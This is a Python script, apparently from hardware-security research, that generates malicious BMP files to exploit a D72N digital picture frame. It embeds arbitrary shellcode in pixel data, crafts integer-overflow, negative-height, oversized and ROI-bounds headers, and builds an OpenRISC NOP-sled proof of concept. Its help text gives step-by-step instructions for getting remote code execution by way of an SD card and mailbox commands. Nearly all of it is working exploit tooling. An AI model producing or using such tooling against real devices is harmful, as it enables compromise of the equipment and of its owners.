#!/usr/bin/env python3
"""
D72N BMP Exploit Generator
===========================

Generate malicious BMP files for exploiting the D72N picture frame.

BMP is the preferred format for RCE because:
  - No compression - pixel data written directly to DRAM
  - Simple header - easy to craft malicious values
  - MB_BMP_CMD_DECODE_MEM_OUT accepts target address parameter

Attack Vectors:
  1. Direct memory write via decode address control
  2. Integer overflow in width * height * BPP
  3. Negative height buffer underflow
  4. ROI bounds escape
  5. Pitch manipulation

Traced from D72N docs:
  - BMP command: 0x10 (dispatched at 0xAC3D in all blocks)
  - Mailbox: 0x40BC
  - MB_BMP_CMD_DECODE_MEM_OUT at AEON 0x4CFFC

Usage:
    python3 d72n_exploit_bmp.py --shellcode shellcode.bin -o exploit.bmp
    python3 d72n_exploit_bmp.py --pattern DEADBEEF --size 100x100 -o test.bmp
    python3 d72n_exploit_bmp.py --overflow -o overflow.bmp
"""

import argparse
import struct
import sys


def create_bmp_header(width, height, bpp=24, compression=0):
    """Create BMP file header and DIB header

    Args:
        width: Image width in pixels
        height: Image height (negative for top-down)
        bpp: Bits per pixel (8, 16, 24, 32)
        compression: Compression method (0 = none)

    Returns:
        bytes: BMP header (54 bytes)
    """
    # Calculate sizes
    row_size = ((width * (bpp // 8) + 3) // 4) * 4
    image_size = row_size * abs(height)
    file_size = 54 + image_size

    header = bytearray()

    # BMP File Header (14 bytes)
    header.extend(b'BM')                          # Magic
    header.extend(struct.pack('<I', file_size))   # File size
    header.extend(struct.pack('<HH', 0, 0))       # Reserved
    header.extend(struct.pack('<I', 54))          # Pixel data offset

    # DIB Header - BITMAPINFOHEADER (40 bytes)
    header.extend(struct.pack('<I', 40))          # Header size
    header.extend(struct.pack('<i', width))       # Width (signed)
    header.extend(struct.pack('<i', height))      # Height (signed, negative = top-down)
    header.extend(struct.pack('<H', 1))           # Color planes
    header.extend(struct.pack('<H', bpp))         # Bits per pixel
    header.extend(struct.pack('<I', compression)) # Compression
    header.extend(struct.pack('<I', image_size))  # Image size
    header.extend(struct.pack('<I', 2835))        # X pixels per meter (72 DPI)
    header.extend(struct.pack('<I', 2835))        # Y pixels per meter
    header.extend(struct.pack('<I', 0))           # Colors in palette
    header.extend(struct.pack('<I', 0))           # Important colors

    return bytes(header)


def create_shellcode_bmp(shellcode, width=64, pad_byte=0x90):
    """Create BMP with shellcode embedded in pixel data

    The shellcode is placed directly in the RGB pixel data,
    which gets written uncompressed to DRAM.

    Args:
        shellcode: bytes of shellcode
        width: Target width (affects alignment)
        pad_byte: Padding byte (0x90 = NOP for x86)

    Returns:
        bytes: Complete BMP file
    """
    bpp = 24
    row_size = ((width * (bpp // 8) + 3) // 4) * 4
    bytes_per_pixel = bpp // 8

    # Calculate required height
    height = (len(shellcode) + row_size - 1) // row_size
    if height < 1:
        height = 1

    image_size = row_size * height

    # Create pixel data with shellcode
    pixel_data = bytearray(image_size)
    pixel_data[:len(shellcode)] = shellcode

    # Fill remainder with pad byte
    for i in range(len(shellcode), image_size):
        pixel_data[i] = pad_byte

    header = create_bmp_header(width, height, bpp)
    return header + bytes(pixel_data)


def create_pattern_bmp(pattern_hex, width, height, bpp=24):
    """Create BMP with repeating pattern

    Useful for testing memory writes and verifying exploit success.

    Args:
        pattern_hex: Hex string pattern (e.g., "DEADBEEF")
        width: Image width
        height: Image height
        bpp: Bits per pixel

    Returns:
        bytes: Complete BMP file
    """
    pattern = bytes.fromhex(pattern_hex)
    row_size = ((width * (bpp // 8) + 3) // 4) * 4
    image_size = row_size * abs(height)

    # Create pixel data with repeating pattern
    pixel_data = bytearray(image_size)
    for i in range(image_size):
        pixel_data[i] = pattern[i % len(pattern)]

    header = create_bmp_header(width, height, bpp)
    return header + bytes(pixel_data)


def create_overflow_bmp(overflow_type='integer'):
    """Create BMP designed to trigger buffer overflow

    Args:
        overflow_type: Type of overflow
            - 'integer': Width * Height * BPP overflow
            - 'negative': Negative height
            - 'huge': Huge dimensions

    Returns:
        bytes: BMP file (may be malformed)
    """
    if overflow_type == 'integer':
        # Width * Height * BPP overflows to small value
        # 0x10000 * 0x1000 * 3 = 0xC0000000, wraps
        width = 0x5555
        height = 0x5555
        bpp = 24

        header = create_bmp_header(width, height, bpp)
        # Only include small amount of actual data
        pixel_data = b'\x41' * 0x1000
        return header + pixel_data

    elif overflow_type == 'negative':
        # Negative height - may cause buffer underflow
        width = 100
        height = -100  # Top-down, but may be mishandled
        bpp = 24

        row_size = ((width * (bpp // 8) + 3) // 4) * 4
        pixel_data = b'\x42' * (row_size * 100)
        header = create_bmp_header(width, height, bpp)
        return header + pixel_data

    elif overflow_type == 'huge':
        # Huge claimed dimensions with small actual data
        # May cause allocation failure or wraparound
        width = 0x7FFFFFFF
        height = 0x7FFFFFFF
        bpp = 32

        header = create_bmp_header(width, height, bpp)
        # Only 256 bytes of actual data
        pixel_data = b'\x43' * 256
        return header + pixel_data

    else:
        raise ValueError(f"Unknown overflow type: {overflow_type}")


def create_roi_exploit_bmp(left=0xFFFF, top=0xFFFF, width=100, height=100):
    """Create BMP designed to exploit ROI bounds checking

    The BMP header values may be processed as ROI parameters,
    potentially allowing out-of-bounds reads/writes.

    Args:
        left: ROI left offset
        top: ROI top offset
        width: Image width
        height: Image height

    Returns:
        bytes: BMP file
    """
    # Create normal-looking BMP
    bpp = 24
    row_size = ((width * (bpp // 8) + 3) // 4) * 4
    image_size = row_size * height

    header = bytearray(create_bmp_header(width, height, bpp))

    # Potentially overload reserved fields with ROI data
    # This is speculative - actual exploit depends on parsing
    struct.pack_into('<H', header, 6, left & 0xFFFF)   # Reserved1
    struct.pack_into('<H', header, 8, top & 0xFFFF)    # Reserved2

    pixel_data = b'\x44' * image_size
    return bytes(header) + pixel_data


def create_aeon_shellcode_bmp(target_addr=0x100000):
    """Create BMP with AEON R2 shellcode

    AEON R2 is a 32-bit RISC processor (OpenRISC variant).
    This creates a BMP with embedded AEON shellcode that can
    be decoded to a specific DRAM address.

    Args:
        target_addr: Target DRAM address for shellcode

    Returns:
        bytes: BMP file with AEON shellcode
    """
    # AEON R2 shellcode (OpenRISC variant)
    # This is a simple infinite loop as proof of concept
    # Real exploit would need proper AEON instruction encoding

    shellcode = bytearray()

    # NOP sled (l.nop = 0x15000000 in OpenRISC)
    for _ in range(16):
        shellcode.extend(struct.pack('>I', 0x15000000))

    # Marker pattern
    shellcode.extend(b'D72N_RCE')

    # Infinite loop (l.j -4 = 0x03FFFFFF)
    shellcode.extend(struct.pack('>I', 0x03FFFFFF))

    return create_shellcode_bmp(shellcode, width=64)


def analyze_bmp(filepath):
    """Analyze a BMP file and display key fields

    Args:
        filepath: Path to BMP file
    """
    with open(filepath, 'rb') as f:
        data = f.read()

    if len(data) < 54:
        print("[-] File too small for BMP header")
        return

    if data[:2] != b'BM':
        print("[-] Not a BMP file (missing magic)")
        return

    # Parse header
    file_size = struct.unpack('<I', data[2:6])[0]
    data_offset = struct.unpack('<I', data[10:14])[0]
    header_size = struct.unpack('<I', data[14:18])[0]
    width = struct.unpack('<i', data[18:22])[0]
    height = struct.unpack('<i', data[22:26])[0]
    bpp = struct.unpack('<H', data[28:30])[0]
    compression = struct.unpack('<I', data[30:34])[0]
    image_size = struct.unpack('<I', data[34:38])[0]

    print("=" * 50)
    print("BMP Analysis")
    print("=" * 50)
    print(f"File size:        {file_size} bytes (claimed)")
    print(f"Actual size:      {len(data)} bytes")
    print(f"Data offset:      {data_offset}")
    print(f"Header size:      {header_size}")
    print(f"Width:            {width}")
    print(f"Height:           {height}")
    print(f"Bits per pixel:   {bpp}")
    print(f"Compression:      {compression}")
    print(f"Image size:       {image_size}")

    # Check for potential exploits
    print()
    print("Exploit Indicators:")

    if height < 0:
        print("  [!] Negative height (top-down)")

    if width > 10000 or abs(height) > 10000:
        print("  [!] Large dimensions - potential DoS")

    calculated_size = ((width * (bpp // 8) + 3) // 4) * 4 * abs(height)
    if calculated_size != image_size:
        print(f"  [!] Size mismatch: claimed {image_size}, calculated {calculated_size}")

    if len(data) < data_offset + image_size:
        print("  [!] Truncated image data")

    # Show first bytes of pixel data
    if len(data) > data_offset:
        print()
        print("First 32 bytes of pixel data:")
        pixel_data = data[data_offset:data_offset+32]
        print(' '.join(f'{b:02X}' for b in pixel_data))


def main():
    parser = argparse.ArgumentParser(
        description='D72N BMP Exploit Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Create BMP with shellcode
    python3 d72n_exploit_bmp.py --shellcode shellcode.bin -o exploit.bmp

    # Create BMP with test pattern
    python3 d72n_exploit_bmp.py --pattern DEADBEEF --size 100x100 -o test.bmp

    # Create integer overflow BMP
    python3 d72n_exploit_bmp.py --overflow integer -o overflow.bmp

    # Create negative height BMP
    python3 d72n_exploit_bmp.py --overflow negative -o negative.bmp

    # Create ROI exploit BMP
    python3 d72n_exploit_bmp.py --roi-exploit -o roi.bmp

    # Create AEON shellcode BMP
    python3 d72n_exploit_bmp.py --aeon-shellcode -o aeon.bmp

    # Analyze existing BMP
    python3 d72n_exploit_bmp.py --analyze test.bmp

Attack Notes:
    The BMP command 0x10 (MB_BMP_CMD_DECODE_MEM_OUT) accepts:
    - addr: 32-bit target DRAM address
    - pitch: bytes per output line
    - down_factor: downscale factor

    To trigger RCE:
    1. Place malicious BMP on SD card
    2. Use SERDB to modify mailbox params (0x40BD-0x40BF)
       with target address (e.g., AEON code at 0x000200)
    3. Trigger BMP decode via mailbox command 0x10
    4. Shellcode written to target address
        """
    )

    # Input options
    input_group = parser.add_mutually_exclusive_group()
    input_group.add_argument('--shellcode', '-s', metavar='FILE',
                             help='Shellcode file to embed')
    input_group.add_argument('--pattern', '-p', metavar='HEX',
                             help='Hex pattern to repeat (e.g., DEADBEEF)')
    input_group.add_argument('--overflow', metavar='TYPE',
                             choices=['integer', 'negative', 'huge'],
                             help='Create overflow exploit BMP')
    input_group.add_argument('--roi-exploit', action='store_true',
                             help='Create ROI bounds exploit BMP')
    input_group.add_argument('--aeon-shellcode', action='store_true',
                             help='Create BMP with AEON R2 shellcode')
    input_group.add_argument('--analyze', '-a', metavar='FILE',
                             help='Analyze existing BMP file')

    # Size options
    parser.add_argument('--size', default='100x100',
                        help='Image size WIDTHxHEIGHT (default: 100x100)')
    parser.add_argument('--bpp', type=int, default=24, choices=[8, 16, 24, 32],
                        help='Bits per pixel (default: 24)')
    parser.add_argument('--width', type=int, default=64,
                        help='Width for shellcode BMP (default: 64)')

    # Output
    parser.add_argument('-o', '--output', required=False,
                        help='Output BMP file')

    args = parser.parse_args()

    # Parse size
    try:
        width, height = map(int, args.size.split('x'))
    except ValueError:
        print(f"[-] Invalid size format: {args.size}")
        return 1

    # Handle analyze mode
    if args.analyze:
        analyze_bmp(args.analyze)
        return 0

    # Generate BMP
    bmp_data = None

    if args.shellcode:
        with open(args.shellcode, 'rb') as f:
            shellcode = f.read()
        print(f"[*] Loaded {len(shellcode)} bytes of shellcode")
        bmp_data = create_shellcode_bmp(shellcode, width=args.width)
        print(f"[+] Created shellcode BMP ({len(bmp_data)} bytes)")

    elif args.pattern:
        bmp_data = create_pattern_bmp(args.pattern, width, height, args.bpp)
        print(f"[+] Created pattern BMP ({len(bmp_data)} bytes)")

    elif args.overflow:
        bmp_data = create_overflow_bmp(args.overflow)
        print(f"[+] Created {args.overflow} overflow BMP ({len(bmp_data)} bytes)")

    elif args.roi_exploit:
        bmp_data = create_roi_exploit_bmp()
        print(f"[+] Created ROI exploit BMP ({len(bmp_data)} bytes)")

    elif args.aeon_shellcode:
        bmp_data = create_aeon_shellcode_bmp()
        print(f"[+] Created AEON shellcode BMP ({len(bmp_data)} bytes)")

    else:
        # Default: create test pattern
        bmp_data = create_pattern_bmp('41414141', width, height, args.bpp)
        print(f"[+] Created test BMP ({len(bmp_data)} bytes)")

    # Save output
    if args.output:
        with open(args.output, 'wb') as f:
            f.write(bmp_data)
        print(f"[+] Saved to {args.output}")

        # Analyze the created file
        print()
        analyze_bmp(args.output)
    else:
        print("[-] No output file specified (use -o)")

    return 0


if __name__ == '__main__':
    sys.exit(main())
